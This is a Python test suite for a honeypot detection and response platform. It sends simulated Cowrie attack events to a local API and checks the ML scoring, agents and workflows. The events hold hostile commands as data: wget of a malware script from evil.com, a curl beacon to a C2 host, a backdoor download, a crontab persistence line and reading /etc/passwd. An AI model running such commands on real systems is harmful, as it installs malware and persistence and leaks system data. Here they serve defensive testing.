#!/usr/bin/env python3
"""
Comprehensive Azure Honeypot Testing Suite
Tests ML models, agents, tools, and response combinations
"""

import asyncio
import json
import logging
import sys
import time
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from pathlib import Path
import aiohttp
import subprocess

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration
API_BASE_URL = "http://localhost:8000"
API_KEY = None  # Will be loaded from .env
TPOT_HOST = None  # Will be loaded from .env
TPOT_SSH_PORT = 64295


class Color:
    """Terminal colors for output"""
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    RED = '\033[0;31m'
    PURPLE = '\033[0;35m'
    CYAN = '\033[0;36m'
    NC = '\033[0m'
    BOLD = '\033[1m'


def print_header(text: str):
    """Print formatted header"""
    print(f"\n{Color.BLUE}{'='*80}{Color.NC}")
    print(f"{Color.BOLD}{Color.BLUE}{text}{Color.NC}")
    print(f"{Color.BLUE}{'='*80}{Color.NC}\n")


def print_test(test_name: str):
    """Print test name"""
    print(f"{Color.YELLOW}[TEST] {test_name}{Color.NC}")


def print_success(message: str):
    """Print success message"""
    print(f"{Color.GREEN}✅ {message}{Color.NC}")


def print_error(message: str):
    """Print error message"""
    print(f"{Color.RED}❌ {message}{Color.NC}")


def print_info(message: str):
    """Print info message"""
    print(f"{Color.CYAN}ℹ️  {message}{Color.NC}")


def print_warning(message: str):
    """Print warning message"""
    print(f"{Color.YELLOW}⚠️  {message}{Color.NC}")


def load_env_config():
    """Load configuration from .env file"""
    global API_KEY, TPOT_HOST
    
    env_file = Path(__file__).parent.parent / "backend" / ".env"
    if not env_file.exists():
        print_error(f"Configuration file not found: {env_file}")
        sys.exit(1)
    
    with open(env_file, 'r') as f:
        for line in f:
            if line.startswith('API_KEY='):
                API_KEY = line.split('=', 1)[1].strip()
            elif line.startswith('TPOT_HOST='):
                TPOT_HOST = line.split('=', 1)[1].strip()
    
    if not API_KEY or not TPOT_HOST:
        print_error("Missing required configuration (API_KEY, TPOT_HOST)")
        sys.exit(1)
    
    print_success(f"Configuration loaded - T-Pot: {TPOT_HOST}")


class TestResults:
    """Track test results"""
    def __init__(self):
        self.total = 0
        self.passed = 0
        self.failed = 0
        self.warnings = 0
        self.details = []
    
    def add_pass(self, test_name: str, details: str = ""):
        self.total += 1
        self.passed += 1
        self.details.append({
            "test": test_name,
            "status": "PASS",
            "details": details
        })
        print_success(f"{test_name}: PASSED {details}")
    
    def add_fail(self, test_name: str, details: str = ""):
        self.total += 1
        self.failed += 1
        self.details.append({
            "test": test_name,
            "status": "FAIL",
            "details": details
        })
        print_error(f"{test_name}: FAILED {details}")
    
    def add_warning(self, test_name: str, details: str = ""):
        self.warnings += 1
        self.details.append({
            "test": test_name,
            "status": "WARNING",
            "details": details
        })
        print_warning(f"{test_name}: WARNING {details}")
    
    def print_summary(self):
        """Print test summary"""
        print_header("TEST SUMMARY")
        print(f"Total Tests: {Color.BOLD}{self.total}{Color.NC}")
        print(f"Passed: {Color.GREEN}{self.passed}{Color.NC}")
        print(f"Failed: {Color.RED}{self.failed}{Color.NC}")
        print(f"Warnings: {Color.YELLOW}{self.warnings}{Color.NC}")
        
        if self.failed == 0:
            print(f"\n{Color.GREEN}{Color.BOLD}🎉 ALL TESTS PASSED!{Color.NC}\n")
        else:
            print(f"\n{Color.RED}{Color.BOLD}⚠️  SOME TESTS FAILED{Color.NC}\n")
        
        # Print detailed results
        print("\nDetailed Results:")
        for result in self.details:
            status_color = {
                "PASS": Color.GREEN,
                "FAIL": Color.RED,
                "WARNING": Color.YELLOW
            }[result["status"]]
            
            print(f"  {status_color}[{result['status']}]{Color.NC} {result['test']}")
            if result['details']:
                print(f"    {result['details']}")


results = TestResults()


async def api_request(method: str, endpoint: str, **kwargs) -> Dict[str, Any]:
    """Make API request"""
    headers = kwargs.pop('headers', {})
    headers['x-api-key'] = API_KEY
    
    url = f"{API_BASE_URL}{endpoint}"
    
    async with aiohttp.ClientSession() as session:
        async with session.request(method, url, headers=headers, **kwargs) as response:
            if response.content_type == 'application/json':
                return await response.json()
            else:
                text = await response.text()
                return {"status_code": response.status, "text": text}


# =============================================================================
# TEST SECTION 1: SYSTEM HEALTH & CONFIGURATION
# =============================================================================

async def test_system_health():
    """Test system health and basic connectivity"""
    print_header("SECTION 1: SYSTEM HEALTH & CONFIGURATION")
    
    # Test 1.1: Backend Health
    print_test("1.1 Backend Health Check")
    try:
        response = await api_request('GET', '/health')
        if response.get('status') == 'healthy':
            results.add_pass("Backend Health", f"Database: {response.get('database')}")
        else:
            results.add_fail("Backend Health", "System not healthy")
    except Exception as e:
        results.add_fail("Backend Health", str(e))
    
    # Test 1.2: ML Model Status
    print_test("1.2 ML Model Status")
    try:
        response = await api_request('GET', '/api/ml/status')
        models_trained = response.get('metrics', {}).get('models_trained', 0)
        if models_trained > 0:
            results.add_pass("ML Model Status", f"{models_trained} models trained")
        else:
            results.add_fail("ML Model Status", "No models trained")
    except Exception as e:
        results.add_fail("ML Model Status", str(e))
    
    # Test 1.3: Agent Credentials
    print_test("1.3 Agent Credentials Check")
    try:
        response = await api_request('GET', '/api/agents/status')
        agents = response.get('agents', [])
        if len(agents) >= 6:
            results.add_pass("Agent Credentials", f"{len(agents)} agents configured")
        else:
            results.add_warning("Agent Credentials", f"Only {len(agents)} agents configured (expected 6)")
    except Exception as e:
        results.add_fail("Agent Credentials", str(e))
    
    # Test 1.4: SageMaker Endpoint
    print_test("1.4 SageMaker Endpoint Status")
    try:
        response = await api_request('GET', '/api/ml/sagemaker/status')
        endpoint_status = response.get('endpoint_status', 'unknown')
        if endpoint_status == 'InService':
            results.add_pass("SageMaker Endpoint", "Endpoint is healthy")
        else:
            results.add_warning("SageMaker Endpoint", f"Status: {endpoint_status}")
    except Exception as e:
        results.add_warning("SageMaker Endpoint", str(e))


# =============================================================================
# TEST SECTION 2: HONEYPOT ATTACK SIMULATION
# =============================================================================

async def test_honeypot_attacks():
    """Simulate various attack types against the honeypot"""
    print_header("SECTION 2: HONEYPOT ATTACK SIMULATION")
    
    # Test 2.1: SSH Brute Force
    print_test("2.1 SSH Brute Force Simulation")
    try:
        # Generate SSH brute force events
        events = []
        attacker_ip = "203.0.113.50"
        
        for i in range(10):
            events.append({
                "eventid": "cowrie.login.failed",
                "src_ip": attacker_ip,
                "dst_port": 22,
                "message": f"SSH login attempt with username 'admin' and password 'pass{i}'",
                "timestamp": datetime.utcnow().isoformat(),
                "raw": {
                    "username": "admin",
                    "password": f"password{i}",
                    "session": f"test_session_{i}",
                    "test_attack": "ssh_brute_force"
                }
            })
        
        # Ingest events
        payload = {
            "source_type": "cowrie",
            "hostname": "azure-test-honeypot",
            "events": events
        }
        
        response = await api_request('POST', '/ingest/multi', json=payload)
        processed = response.get('processed', 0)
        
        if processed == len(events):
            results.add_pass("SSH Brute Force", f"{processed} events ingested")
        else:
            results.add_fail("SSH Brute Force", f"Only {processed}/{len(events)} events processed")
        
        # Wait for detection
        await asyncio.sleep(3)
        
    except Exception as e:
        results.add_fail("SSH Brute Force", str(e))
    
    # Test 2.2: Port Scan Simulation
    print_test("2.2 Port Scan Simulation")
    try:
        attacker_ip = "203.0.113.51"
        events = []
        
        ports = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3389]
        for port in ports:
            events.append({
                "eventid": "cowrie.session.connect",
                "src_ip": attacker_ip,
                "dst_port": port,
                "message": f"Connection attempt to port {port}",
                "timestamp": datetime.utcnow().isoformat(),
                "raw": {
                    "port": port,
                    "protocol": "tcp",
                    "test_attack": "port_scan"
                }
            })
        
        payload = {
            "source_type": "cowrie",
            "hostname": "azure-test-honeypot",
            "events": events
        }
        
        response = await api_request('POST', '/ingest/multi', json=payload)
        processed = response.get('processed', 0)
        
        if processed == len(events):
            results.add_pass("Port Scan", f"{processed} events ingested")
        else:
            results.add_fail("Port Scan", f"Only {processed}/{len(events)} events processed")
        
        await asyncio.sleep(3)
        
    except Exception as e:
        results.add_fail("Port Scan", str(e))
    
    # Test 2.3: Command Execution (Malware)
    print_test("2.3 Malware Command Execution")
    try:
        attacker_ip = "203.0.113.52"
        events = []
        
        malicious_commands = [
            "wget http://evil.com/malware.sh",
            "chmod +x malware.sh",
            "./malware.sh",
            "curl http://c2.evil.com/beacon",
            "python3 cryptominer.py"
        ]
        
        for cmd in malicious_commands:
            events.append({
                "eventid": "cowrie.command.input",
                "src_ip": attacker_ip,
                "dst_port": 22,
                "message": f"Command executed: {cmd}",
                "timestamp": datetime.utcnow().isoformat(),
                "raw": {
                    "input": cmd,
                    "session": "malware_session",
                    "test_attack": "malware_execution"
                }
            })
        
        payload = {
            "source_type": "cowrie",
            "hostname": "azure-test-honeypot",
            "events": events
        }
        
        response = await api_request('POST', '/ingest/multi', json=payload)
        processed = response.get('processed', 0)
        
        if processed == len(events):
            results.add_pass("Malware Execution", f"{processed} events ingested")
        else:
            results.add_fail("Malware Execution", f"Only {processed}/{len(events)} events processed")
        
        await asyncio.sleep(3)
        
    except Exception as e:
        results.add_fail("Malware Execution", str(e))
    
    # Test 2.4: File Download (APT)
    print_test("2.4 APT File Download")
    try:
        attacker_ip = "203.0.113.53"
        events = []
        
        events.append({
            "eventid": "cowrie.session.file_download",
            "src_ip": attacker_ip,
            "dst_port": 22,
            "message": "File downloaded from suspicious source",
            "timestamp": datetime.utcnow().isoformat(),
            "raw": {
                "url": "http://apt-server.evil.com/backdoor.elf",
                "outfile": "/tmp/backdoor.elf",
                "shasum": "deadbeef1234567890abcdef",
                "test_attack": "apt_download"
            }
        })
        
        events.append({
            "eventid": "cowrie.command.input",
            "src_ip": attacker_ip,
            "dst_port": 22,
            "message": "Persistence mechanism installed",
            "timestamp": datetime.utcnow().isoformat(),
            "raw": {
                "input": "echo '* * * * * /tmp/backdoor.elf' | crontab -",
                "test_attack": "apt_persistence"
            }
        })
        
        payload = {
            "source_type": "cowrie",
            "hostname": "azure-test-honeypot",
            "events": events
        }
        
        response = await api_request('POST', '/ingest/multi', json=payload)
        processed = response.get('processed', 0)
        
        if processed == len(events):
            results.add_pass("APT Download", f"{processed} events ingested")
        else:
            results.add_fail("APT Download", f"Only {processed}/{len(events)} events processed")
        
        await asyncio.sleep(3)
        
    except Exception as e:
        results.add_fail("APT Download", str(e))


# =============================================================================
# TEST SECTION 3: ML MODEL PREDICTIONS & CONFIDENCE SCORING
# =============================================================================

async def test_ml_predictions():
    """Test ML model predictions and confidence scoring"""
    print_header("SECTION 3: ML MODEL PREDICTIONS & CONFIDENCE SCORING")
    
    # Wait for incidents to be created
    await asyncio.sleep(5)
    
    # Test 3.1: Get Recent Incidents
    print_test("3.1 Incident Detection")
    try:
        response = await api_request('GET', '/incidents')
        incidents = response if isinstance(response, list) else []
        
        if len(incidents) > 0:
            results.add_pass("Incident Detection", f"{len(incidents)} incidents detected")
        else:
            results.add_fail("Incident Detection", "No incidents created from attacks")
            return
        
        # Test 3.2: ML Confidence Scores
        print_test("3.2 ML Confidence Scoring")
        high_confidence_count = 0
        
        for incident in incidents[:5]:  # Check first 5 incidents
            ml_confidence = incident.get('ml_confidence', 0)
            threat_type = incident.get('threat_type', 'unknown')
            
            print_info(f"Incident {incident['id']}: {threat_type} - Confidence: {ml_confidence:.2%}")
            
            if ml_confidence > 0.5:
                high_confidence_count += 1
        
        if high_confidence_count > 0:
            results.add_pass("ML Confidence", f"{high_confidence_count} incidents with >50% confidence")
        else:
            results.add_warning("ML Confidence", "No high-confidence predictions")
        
        # Test 3.3: Threat Classification
        print_test("3.3 Threat Classification")
        threat_types = set(inc.get('threat_type') for inc in incidents if inc.get('threat_type'))
        
        if len(threat_types) > 1:
            results.add_pass("Threat Classification", f"{len(threat_types)} different threat types: {', '.join(threat_types)}")
        else:
            results.add_warning("Threat Classification", f"Only {len(threat_types)} threat type detected")
        
        # Test 3.4: ML Prediction Details
        print_test("3.4 ML Prediction Details")
        for incident in incidents[:3]:
            incident_id = incident['id']
            try:
                detail_response = await api_request('GET', f'/incidents/{incident_id}')
                
                if 'ml_analysis' in detail_response or 'anomaly_score' in detail_response:
                    anomaly_score = detail_response.get('anomaly_score', 0)
                    print_info(f"Incident {incident_id}: Anomaly Score = {anomaly_score:.3f}")
                    results.add_pass(f"ML Details (Inc {incident_id})", f"Anomaly: {anomaly_score:.3f}")
                else:
                    results.add_warning(f"ML Details (Inc {incident_id})", "No ML analysis found")
            except Exception as e:
                results.add_fail(f"ML Details (Inc {incident_id})", str(e))
        
    except Exception as e:
        results.add_fail("Incident Detection", str(e))


# =============================================================================
# TEST SECTION 4: AGENT RESPONSES
# =============================================================================

async def test_agent_responses():
    """Test all agent responses and analysis"""
    print_header("SECTION 4: AGENT RESPONSES")
    
    # Get first incident for testing
    try:
        response = await api_request('GET', '/incidents')
        incidents = response if isinstance(response, list) else []
        
        if not incidents:
            results.add_warning("Agent Testing", "No incidents available for agent testing")
            return
        
        test_incident = incidents[0]
        incident_id = test_incident['id']
        print_info(f"Testing agents with incident {incident_id}")
        
        # Test 4.1: Containment Agent
        print_test("4.1 Containment Agent")
        try:
            agent_response = await api_request(
                'POST',
                f'/incidents/{incident_id}/actions/containment-block-ip'
            )
            
            if agent_response.get('action'):
                results.add_pass("Containment Agent", "Block IP action created")
            else:
                results.add_warning("Containment Agent", "Action created but no confirmation")
        except Exception as e:
            results.add_fail("Containment Agent", str(e))
        
        # Test 4.2: Forensics Agent
        print_test("4.2 Forensics Agent")
        try:
            agent_response = await api_request(
                'POST',
                f'/incidents/{incident_id}/actions/forensics-collect-evidence'
            )
            
            if agent_response.get('action'):
                results.add_pass("Forensics Agent", "Evidence collection initiated")
            else:
                results.add_warning("Forensics Agent", "Action created but no confirmation")
        except Exception as e:
            results.add_fail("Forensics Agent", str(e))
        
        # Test 4.3: Attribution Agent
        print_test("4.3 Attribution Agent")
        try:
            agent_response = await api_request(
                'POST',
                f'/incidents/{incident_id}/actions/attribution-lookup'
            )
            
            if agent_response.get('action'):
                results.add_pass("Attribution Agent", "Threat intel lookup completed")
            else:
                results.add_warning("Attribution Agent", "Action created but no confirmation")
        except Exception as e:
            results.add_fail("Attribution Agent", str(e))
        
        # Test 4.4: Deception Agent (Honeypot-specific)
        print_test("4.4 Deception Agent")
        try:
            agent_response = await api_request(
                'POST',
                f'/incidents/{incident_id}/actions/honeypot-profile-attacker'
            )
            
            if agent_response.get('action'):
                results.add_pass("Deception Agent", "Attacker profiling completed")
            else:
                results.add_warning("Deception Agent", "Action created but no confirmation")
        except Exception as e:
            results.add_fail("Deception Agent", str(e))
        
        # Test 4.5: Threat Hunting Agent
        print_test("4.5 Threat Hunting Agent")
        try:
            agent_response = await api_request(
                'POST',
                f'/incidents/{incident_id}/actions/threat-hunt'
            )
            
            if agent_response.get('action'):
                results.add_pass("Threat Hunting Agent", "Threat hunt initiated")
            else:
                results.add_warning("Threat Hunting Agent", "Action created but no confirmation")
        except Exception as e:
            results.add_fail("Threat Hunting Agent", str(e))
        
    except Exception as e:
        results.add_fail("Agent Testing Setup", str(e))


# =============================================================================
# TEST SECTION 5: WORKFLOW EXECUTION & TOOLS
# =============================================================================

async def test_workflow_execution():
    """Test workflow creation and execution with various tools"""
    print_header("SECTION 5: WORKFLOW EXECUTION & TOOLS")
    
    # Get first incident
    try:
        response = await api_request('GET', '/incidents')
        incidents = response if isinstance(response, list) else []
        
        if not incidents:
            results.add_warning("Workflow Testing", "No incidents for workflow testing")
            return
        
        test_incident = incidents[0]
        incident_id = test_incident['id']
        
        # Test 5.1: NLP Workflow Creation
        print_test("5.1 NLP Workflow Creation")
        try:
            nlp_commands = [
                "Block this attacker's IP and investigate the behavior",
                "Isolate affected systems and collect forensic evidence",
                "Hunt for similar attacks across the network"
            ]
            
            for cmd in nlp_commands:
                workflow_response = await api_request(
                    'POST',
                    '/api/nlp/parse-and-execute',
                    json={
                        "query": cmd,
                        "incident_id": incident_id
                    }
                )
                
                if workflow_response.get('workflow_id'):
                    results.add_pass(f"NLP Workflow: '{cmd[:30]}...'", f"ID: {workflow_response['workflow_id']}")
                else:
                    results.add_warning(f"NLP Workflow: '{cmd[:30]}...'", "Workflow not created")
                
                await asyncio.sleep(1)
        
        except Exception as e:
            results.add_fail("NLP Workflow Creation", str(e))
        
        # Test 5.2: Get All Workflows
        print_test("5.2 Workflow Listing")
        try:
            workflows_response = await api_request('GET', '/api/workflows')
            workflows = workflows_response.get('workflows', [])
            
            if len(workflows) > 0:
                results.add_pass("Workflow Listing", f"{len(workflows)} workflows found")
            else:
                results.add_warning("Workflow Listing", "No workflows found")
        
        except Exception as e:
            results.add_fail("Workflow Listing", str(e))
        
        # Test 5.3: Response Actions
        print_test("5.3 Response Actions")
        try:
            actions_response = await api_request('GET', '/api/response-actions/available')
            actions = actions_response.get('actions', [])
            
            if len(actions) > 20:
                results.add_pass("Response Actions", f"{len(actions)} actions available")
            else:
                results.add_warning("Response Actions", f"Only {len(actions)} actions available")
        
        except Exception as e:
            results.add_fail("Response Actions", str(e))
        
        # Test 5.4: Investigation Creation
        print_test("5.4 Investigation Creation")
        try:
            investigation_response = await api_request(
                'POST',
                f'/incidents/{incident_id}/investigate',
                json={
                    "investigation_type": "deep_analysis",
                    "scope": "comprehensive"
                }
            )
            
            if investigation_response.get('investigation_id'):
                results.add_pass("Investigation Creation", f"ID: {investigation_response['investigation_id']}")
            else:
                results.add_warning("Investigation Creation", "Investigation created but no ID returned")
        
        except Exception as e:
            results.add_fail("Investigation Creation", str(e))
        
    except Exception as e:
        results.add_fail("Workflow Testing Setup", str(e))


# =============================================================================
# TEST SECTION 6: INTEGRATION TESTS
# =============================================================================

async def test_integrations():
    """Test system integrations and end-to-end flows"""
    print_header("SECTION 6: INTEGRATION TESTS")
    
    # Test 6.1: Chat Interface
    print_test("6.1 Chat Interface")
    try:
        chat_response = await api_request(
            'POST',
            '/chat',
            json={
                "query": "Show me the most recent security incidents",
                "context": {}
            }
        )
        
        if chat_response.get('response'):
            results.add_pass("Chat Interface", "Chat responding correctly")
        else:
            results.add_fail("Chat Interface", "No response from chat")
    
    except Exception as e:
        results.add_fail("Chat Interface", str(e))
    
    # Test 6.2: Alert System
    print_test("6.2 Alert System")
    try:
        alerts_response = await api_request('GET', '/api/alerts')
        alerts = alerts_response if isinstance(alerts_response, list) else []
        
        print_info(f"Found {len(alerts)} alerts")
        results.add_pass("Alert System", f"{len(alerts)} alerts generated")
    
    except Exception as e:
        results.add_fail("Alert System", str(e))
    
    # Test 6.3: Dashboard Metrics
    print_test("6.3 Dashboard Metrics")
    try:
        metrics_response = await api_request('GET', '/api/dashboard/metrics')
        
        if metrics_response.get('total_incidents') is not None:
            results.add_pass("Dashboard Metrics", f"Incidents: {metrics_response['total_incidents']}")
        else:
            results.add_fail("Dashboard Metrics", "Metrics not available")
    
    except Exception as e:
        results.add_fail("Dashboard Metrics", str(e))
    
    # Test 6.4: Event Statistics
    print_test("6.4 Event Statistics")
    try:
        events_response = await api_request('GET', '/events')
        events = events_response if isinstance(events_response, list) else []
        
        if len(events) > 0:
            results.add_pass("Event Statistics", f"{len(events)} events recorded")
        else:
            results.add_warning("Event Statistics", "No events found")
    
    except Exception as e:
        results.add_fail("Event Statistics", str(e))


# =============================================================================
# TEST SECTION 7: ADVANCED SCENARIOS
# =============================================================================

async def test_advanced_scenarios():
    """Test advanced attack scenarios and response combinations"""
    print_header("SECTION 7: ADVANCED SCENARIOS")
    
    # Test 7.1: Multi-Stage Attack
    print_test("7.1 Multi-Stage Attack Detection")
    try:
        attacker_ip = "203.0.113.100"
        
        # Stage 1: Reconnaissance
        recon_events = [
            {
                "eventid": "cowrie.session.connect",
                "src_ip": attacker_ip,
                "dst_port": port,
                "message": f"Port scan: {port}",
                "timestamp": datetime.utcnow().isoformat(),
                "raw": {"stage": "reconnaissance"}
            }
            for port in [22, 80, 443, 3389]
        ]
        
        # Stage 2: Exploitation
        exploit_events = [
            {
                "eventid": "cowrie.login.failed",
                "src_ip": attacker_ip,
                "dst_port": 22,
                "message": "Brute force attempt",
                "timestamp": datetime.utcnow().isoformat(),
                "raw": {"stage": "exploitation", "username": "admin"}
            }
            for _ in range(5)
        ]
        
        # Stage 3: Post-Exploitation
        post_exploit_events = [
            {
                "eventid": "cowrie.command.input",
                "src_ip": attacker_ip,
                "dst_port": 22,
                "message": f"Command: {cmd}",
                "timestamp": datetime.utcnow().isoformat(),
                "raw": {"stage": "post_exploitation", "input": cmd}
            }
            for cmd in ["whoami", "id", "uname -a", "cat /etc/passwd"]
        ]
        
        all_events = recon_events + exploit_events + post_exploit_events
        
        payload = {
            "source_type": "cowrie",
            "hostname": "azure-multi-stage-test",
            "events": all_events
        }
        
        response = await api_request('POST', '/ingest/multi', json=payload)
        processed = response.get('processed', 0)
        
        if processed == len(all_events):
            results.add_pass("Multi-Stage Attack", f"Detected {processed} events across 3 stages")
        else:
            results.add_fail("Multi-Stage Attack", f"Only detected {processed}/{len(all_events)} events")
        
        await asyncio.sleep(5)
        
    except Exception as e:
        results.add_fail("Multi-Stage Attack", str(e))
    
    # Test 7.2: Coordinated Response
    print_test("7.2 Coordinated Multi-Agent Response")
    try:
        # Get the multi-stage attack incident
        response = await api_request('GET', '/incidents')
        incidents = response if isinstance(response, list) else []
        
        if incidents:
            incident_id = incidents[0]['id']
            
            # Create coordinated response workflow
            workflow_response = await api_request(
                'POST',
                '/api/nlp/parse-and-execute',
                json={
                    "query": "Block the attacker, isolate affected systems, collect forensic evidence, and hunt for similar patterns",
                    "incident_id": incident_id
                }
            )
            
            if workflow_response.get('workflow_id'):
                results.add_pass("Coordinated Response", f"Multi-agent workflow created: {workflow_response['workflow_id']}")
            else:
                results.add_warning("Coordinated Response", "Workflow created but no confirmation")
        else:
            results.add_warning("Coordinated Response", "No incidents for testing")
    
    except Exception as e:
        results.add_fail("Coordinated Response", str(e))
    
    # Test 7.3: Real-Time Honeypot Interaction (if possible)
    print_test("7.3 Real-Time Honeypot Connectivity")
    try:
        # Test SSH connectivity to T-Pot
        result = subprocess.run(
            ['ssh', '-o', 'ConnectTimeout=5', '-o', 'StrictHostKeyChecking=no',
             '-p', str(TPOT_SSH_PORT), f'azureuser@{TPOT_HOST}', 'echo', 'Connected'],
            capture_output=True,
            timeout=10
        )
        
        if result.returncode == 0:
            results.add_pass("Honeypot Connectivity", f"Successfully connected to {TPOT_HOST}")
        else:
            results.add_warning("Honeypot Connectivity", "Could not connect to honeypot")
    
    except Exception as e:
        results.add_warning("Honeypot Connectivity", str(e))


# =============================================================================
# MAIN TEST RUNNER
# =============================================================================

async def run_all_tests():
    """Run all test sections"""
    print(f"{Color.BOLD}{Color.BLUE}")
    print("╔════════════════════════════════════════════════════════════════════════════╗")
    print("║                                                                            ║")
    print("║           COMPREHENSIVE AZURE HONEYPOT TESTING SUITE                      ║")
    print("║                                                                            ║")
    print("║  Testing: ML Models, Agents, Tools, Workflows, and Integrations           ║")
    print("║                                                                            ║")
    print("╚════════════════════════════════════════════════════════════════════════════╝")
    print(f"{Color.NC}\n")
    
    # Load configuration
    load_env_config()
    
    # Run test sections
    await test_system_health()
    await test_honeypot_attacks()
    await test_ml_predictions()
    await test_agent_responses()
    await test_workflow_execution()
    await test_integrations()
    await test_advanced_scenarios()
    
    # Print summary
    results.print_summary()
    
    # Save detailed results
    output_file = Path(__file__).parent / f"test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(output_file, 'w') as f:
        json.dump({
            "timestamp": datetime.now().isoformat(),
            "summary": {
                "total": results.total,
                "passed": results.passed,
                "failed": results.failed,
                "warnings": results.warnings
            },
            "details": results.details
        }, f, indent=2)
    
    print_info(f"Detailed results saved to: {output_file}")
    
    # Return exit code
    return 0 if results.failed == 0 else 1


if __name__ == "__main__":
    exit_code = asyncio.run(run_all_tests())
    sys.exit(exit_code)

